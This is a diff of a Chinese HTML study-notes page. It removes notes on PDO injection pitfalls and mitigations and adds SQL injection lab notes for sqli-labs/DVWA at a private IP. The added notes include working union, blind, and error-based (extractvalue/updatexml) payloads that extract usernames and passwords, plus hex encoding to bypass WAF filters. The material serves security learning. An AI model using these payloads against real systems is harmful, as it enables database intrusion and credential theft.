+<p><strong>注释当中执行代码</strong></p>
+<pre><code>select /*!user*/ from dvwa.users;
 </code></pre>
-<h5 id="binparam">binParam 方式进行绑定参数</h5>
-<h3 id="pdo_6">PDO分为模拟预处理和非模拟预处理</h3>
-<p>模拟预处理 PDO::ATTR_EMULATE_PREPARES 默认为true
-PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。 而模拟参数进行绑定的时候如果数据是攻击者恶意构造的字符串就会造成SQL注入的情况发生。  </p>
-<p>非模拟预处理 两个阶段 
-1、prepare 阶段 将sql语句模板发送到数据库服务器<br />
-2、execute 函数发送占位符参数给数据库服务器 </p>
-<h4 id="_5">主要的安全问题来源的设置</h4>
-<pre><code>? PDO::ATTR_EMULATE_PREPARES //模拟预处理(默认开启)
-? PDO::ATTR_ERRMODE //报错(默认关闭)
-? PDO::MYSQL_ATTR_MULTI_STATEMENTS //允许多句执行(默认开启)
+<p>在sql语句当中的语法其实是存在 运算的</p>
+<pre><code>select * from dvwa.users where first_name=&quot;Bob&quot;or 1+'1'=2 union select 1,2,3,4,'5g',6,7,8 order by 5\G;
 </code></pre>
-<h3 id="_6">安全问题总结</h3>
+<p>和 </p>
+<pre><code>select * from dvwa.users where first_name=&quot;Bob&quot;or 1+'1'=3 union select 1,2,3,4,'5g',6,7,8 order by 5\G;
+</code></pre>
+<p>的返回结果就是不一样的。</p>
+<p>sql注入的分类 </p>
+<pre><code> •基于布尔SQL盲注
+
+​ •基于时间的SQL盲注
+
+​ •基于报错的SQL盲注
+
+基于如何处理输入的SQL查询（数据类型）
+
+•基于字符串
+
+•数字或整数为基础的
+
+基于程度和顺序的注入(哪里发生了影响)
+
+★一阶注射
+
+★二阶注射
+
+一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.
+基于注入点的位置上的
+
+▲通过用户输入的表单域的注射。
+
+▲通过cookie注射。
+
+▲通过服务器变量注射。 （基于头部信息的注射）
+</code></pre>
+<p>and 和 or 的优先级的不同 </p>
+<p>and的优先级 &gt; or </p>
+<p>desc 的用法 </p>
+<p>展现mysql表当中字段结构 </p>
+<p>几种常见的数据连接函数  </p>
 <ol>
-<li>模拟预处理模式下(默认开启)会造成 堆叠注入(默认开启)和 报错注入(默认不开) </li>
-<li>模拟预处理模式下(默认开启)，my.ini文件中设置编码为gbk时会造成 宽字节的注入 </li>
-<li>PDO::ATTR_ERRMODE 开启的情况下，无论是否模拟，都会造成报错信息的展示  </li>
-<li>非模拟预处理模式下 如果没有进行过滤就直接可以执行 
-inline query的注入 </li>
+<li>concat(str1,str2,...)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</li>
+<li>group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
 </ol>
-<p>PDO注入的方案 </p>
-<p>1、宽字节注入 </p>
-<p>只要my.ini当中的编码设置为gbk的时候 %80' 都能绕过转义 </p>
-<h3 id="pdo_7">pdo的安全方案</h3>
-<ol>
-<li>
-<p>禁用模拟预处理语句<br />
-$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 
-它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。 
-这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。</p>
-</li>
-<li>
-<p>不使用gbk字符进行编码  </p>
-</li>
-<li>关闭堆叠注入和报错显示  </li>
-</ol>
-<h2 id="referer">referer</h2>
-<p><a href="https://blog.csdn.net/qiuxuemei915/article/details/106182304">PDO、DAO、ORM之间的区别</a>
-<a href="https://paper.seebug.org/1636/#0x01-pdo">PDO 下的注入思路</a></p>
+<p><img alt="image-20210715165526780" src="D:\Users\80303920\Pictures\typora图床\image-20210715165526780.png" /></p>
+<p>查询数据库</p>
+<pre><code>select schema_name from information_schema.schemata ;
+</code></pre>
+<p>show databaes;</p>
+<p>查询数据表</p>
+<pre><code>select table_name from information_schema.tables where table_schema=&quot;&quot; ;
+</code></pre>
+<p>show tables;</p>
+<p>查询表当中的列 </p>
+<pre><code>select column_name from information_schea.columns where table_name=&quot;&quot;;
+</code></pre>
+<p><strong>进行注入的时候使用 "" 比较少见 一般是将其转换为 0x 的十六进制形式</strong> </p>
+<p>在mysql当中都可以通用十六进制来进行</p>
+<pre><code>select concat_ws(0x23,version(),2);
+</code></pre>
+<p>使用十六进制可以绕过waf的字符串过滤</p>
+<p><strong>另外进行union注入</strong>的时候最好选择将注入语句放在最后 </p>
+<pre><code>index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23
+
+index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23
+</code></pre>
+<p>使用concat 将查询到的数据进行集合</p>
+<p>三个函数 的分析 </p>
+<p>concat </p>
+<p>concat_ws 使用分隔符 进行隔离  </p>
+<p>group_concat 将一组数据使用分隔符进行隔离   </p>
+<pre><code>select group_concat(0x23,1,table_name) from information_schema.tables where table_schema=&quot;security&quot;;
+</code></pre>
+<p>示例 </p>
+<pre><code>192.168.233.140:83/Less-1/index.php?id=-1' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479 %23
+</code></pre>
+<p>`# 可以和--+ 进行相互替换 但是注意有时候需要 #进行urlencode 为 %23</p>
+<p>问题  </p>
+<p>limit在注入当中的应用</p>
+<p>注意闭合其中给的双引号之类的 </p>
+<p>在包含字符当中加上 () 几乎是相同的 </p>
+<pre><code>select username from users;
+select (username) from users;
+</code></pre>
+<h3 id="_1">基于布尔类型</h3>
+<p>注意盲注的类型都是有条件进行筛选，而不是直接逻辑判断  </p>
+<p><img alt="image-20210723150713443" src="D:\Users\80303920\Pictures\typora图床\image-20210723150713443.png" /></p>
+<pre><code>select case when {判断语句} then sleep(3) else 1 end;
+select case when (ascii(substr((select version()),1,1))=58) then sleep(3) else end;
+</code></pre>
+<p>​           </p>
+<pre><code>select case When ascii(substr(concat(user,password),1,1))&gt;53 THEN 1 else 0 end from users limit 0,1;
+</code></pre>
+<p>使用case when只能在基于时间的盲注当中存在一些，其他没什么用 </p>
+<pre><code>select user from users where user=&quot;admin&quot; and 1= (select case when ascii(substr((select User from mysql.user limit 0,1),1,1)) =97 then 1 else 0 end);
+</code></pre>
+<p>通常是在sql语句当中加入逻辑根据返回的结果来判断</p>
+<p>一般的判断语句为 </p>
+<pre><code>and  
+and 1= (select 1 f)
+or 
+if 
+</code></pre>
+<p>case语句 </p>
+<p>字符串的截取函数 </p>
+<pre><code>substr 
+mid 
+cast 
+</code></pre>
+<h3 id="_2">报错进行打印内容</h3>
+<p><strong>extractvalue</strong> </p>
+<p>extracvalue从目标的XML文件当中查询的字符串 </p>
+<pre><code>extractvalue(1,concat(0x7e,(select @@version),0x7e))
+
+http://192.168.233.140:83/Less-5/?id=1%27%20and%20extractvalue(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e))--+
+</code></pre>
+<p><strong>updatexml</strong> </p>
+<pre><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+
+http://192.168.233.140:83/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e),1)--+
+</code></pre>
+<p>updatexml的本意是更新xpath文档当中的字符串，我们的xpath_string写错的时候就会出现错误 </p>
+<p><strong>name_const</strong>  </p>
+<p>感觉平时使用的比较少 </p>
+<pre><code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
+
+http://192.168.233.140:83/Less-5/?id=1%27%20and%20select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+
+</code></pre>
+<p><strong>floor()+count()+group by</strong></p>
+<p>问题 </p>
+<p>比较好的文章</p>
+<p>https://www.freebuf.com/articles/web/175049.html</p>
+<h3 id="orderby">orderby 注入</h3>
+<p>1、通过返回的数据的排列</p>
+<p>2、通过if else来进行布尔判断注入的成功与否 </p>
                 
               
               
@@ -1773,41 +1686,6 @@ $dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
       
         
 <footer class="md-footer">
-  
-    <nav class="md-footer__inner md-grid" aria-label="Footer">
-      
-        
-        <a href="../NOsql%E6%B3%A8%E5%85%A5/" class="md-footer__link md-footer__link--prev" aria-label="Previous: NOsql注入" rel="prev">
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-          </div>
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              NOsql注入
-            </div>
-          </div>
-        </a>
-      
-      
-        
-        <a href="../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-footer__link md-footer__link--next" aria-label="Next: 约束委派" rel="next">
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              约束委派
-            </div>
-          </div>
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-          </div>
-        </a>
-      
-    </nav>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
@@ -1830,10 +1708,10 @@ $dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
     <div class="md-dialog" data-md-component="dialog">
       <div class="md-dialog__inner md-typeset"></div>
     </div>
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.expand", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.8397ff9e.min.js", "version": null}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.expand", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.8397ff9e.min.js", "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.f89c2efe.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.f89c2efe.min.js"></script>
       
     
   </body>
